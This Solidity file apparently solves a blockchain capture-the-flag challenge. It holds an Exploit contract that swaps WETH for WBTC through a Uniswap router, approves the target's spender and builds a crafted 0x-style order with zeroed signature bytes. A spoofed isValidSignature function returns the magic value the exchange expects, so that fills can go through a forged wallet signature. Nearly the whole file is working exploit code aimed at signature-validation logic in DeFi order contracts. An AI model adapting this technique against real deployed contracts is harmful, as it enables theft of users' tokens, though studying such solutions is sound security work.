// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "public/Setup.sol";

contract LibOrder {
    struct Order {
        address makerAddress;           // Address that created the order.      
        address takerAddress;           // Address that is allowed to fill the order. If set to 0, any address is allowed to fill the order.          
        address feeRecipientAddress;    // Address that will recieve fees when order is filled.      
        address senderAddress;          // Address that is allowed to call Exchange contract methods that affect this order. If set to 0, any address is allowed to call these methods.
        uint256 makerAssetAmount;       // Amount of makerAsset being offered by maker. Must be greater than 0.        
        uint256 takerAssetAmount;       // Amount of takerAsset being bid on by maker. Must be greater than 0.        
        uint256 makerFee;               // Amount of ZRX paid to feeRecipient by maker when order is filled. If set to 0, no transfer of ZRX from maker to feeRecipient will be attempted.
        uint256 takerFee;               // Amount of ZRX paid to feeRecipient by taker when order is filled. If set to 0, no transfer of ZRX from taker to feeRecipient will be attempted.
        uint256 expirationTimeSeconds;  // Timestamp in seconds at which order expires.          
        uint256 salt;                   // Arbitrary number to facilitate uniqueness of the order's hash.     
        bytes makerAssetData;           // Encoded data that can be decoded by a specified proxy contract when transferring makerAsset. The last byte references the id of this proxy.
        bytes takerAssetData;           // Encoded data that can be decoded by a specified proxy contract when transferring takerAsset. The last byte references the id of this proxy.
    }

    struct OrderInfo {
        uint8 orderStatus;                    // Status that describes order's validity and fillability.
        bytes32 orderHash;                    // EIP712 hash of the order (see LibOrder.getOrderHash).
        uint256 orderTakerAssetFilledAmount;  // Amount of order that has already been filled.
    }
}

interface UserProxyLike {
    function toPMM(bytes calldata _payload) external payable;
}

interface ExchangeLike {
    function fillOrKillOrder(
        LibOrder.Order calldata order,
        uint takerAssetFillAmount,
        bytes calldata signature
    ) external;
}

interface ERC20LikeImpl is ERC20Like {
    function transfer(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
    function approve(address, uint) external returns (bool);

    function balanceOf(address) external view returns (uint);
    function totalSupply() external view returns (uint);
}

interface PMMLike {
    function fill(
        uint256 userSalt,
        bytes memory data,
        bytes memory userSignature
    ) external payable returns (uint256);

    function spender() external view returns (SpenderLike);

    function zeroExchange() external view returns (ExchangeLike);
}

interface SpenderLike {
    function allowanceTarget() external view returns (address);
}

interface SwapRouterLike {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata) external payable returns (uint);
}

contract Exploit is LibOrder {
    Setup private immutable SETUP;
        
    SwapRouterLike private immutable ROUTER = SwapRouterLike(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);

    ERC20LikeImpl private immutable WBTC = ERC20LikeImpl(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ERC20LikeImpl private immutable WETH = ERC20LikeImpl(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(Setup setup) payable {
        SETUP = setup;

        ROUTER.exactOutputSingle{value: msg.value}(SwapRouterLike.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(WBTC),
            fee: 3000,
            recipient: address(this),
            amountOut: 1,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        }));

        WBTC.approve(PMMLike(SETUP.TARGET()).spender().allowanceTarget(), type(uint).max);
    }


    function generatePayload(uint id) external view returns (bytes memory) {
        uint256 salt = (id << 16);

        LibOrder.Order memory order = LibOrder.Order({
            makerAddress: address(this),
            takerAddress: address(SETUP.TARGET()),
            feeRecipientAddress: address(this),
            senderAddress: address(SETUP.TARGET()),
            makerAssetAmount: 1,
            takerAssetAmount: 1,
            makerFee: 0,
            takerFee: 0,
            expirationTimeSeconds: type(uint).max,
            salt: salt,
            makerAssetData: abi.encodeWithSelector(0x02571792, WBTC),
            takerAssetData: abi.encodeWithSelector(0xf47261b0, WBTC)
        });

        bytes memory userData = abi.encodeWithSelector(
            ExchangeLike.fillOrKillOrder.selector,
            order,
            1,
            hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004"
        );

        return abi.encodeWithSelector(UserProxyLike.toPMM.selector, abi.encodeWithSelector(
            PMMLike.fill.selector,
            salt,
            userData,
            abi.encodePacked(hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", address(this))
        ));
    }

    function isValidSignature(bytes32, bytes calldata) external view returns (bytes4) {
        return msg.sender == address(PMMLike(SETUP.TARGET()).zeroExchange()) ? bytes4(keccak256("isValidWalletSignature(bytes32,address,bytes)")) : Exploit.isValidSignature.selector;
    }

    receive() external payable {}
}
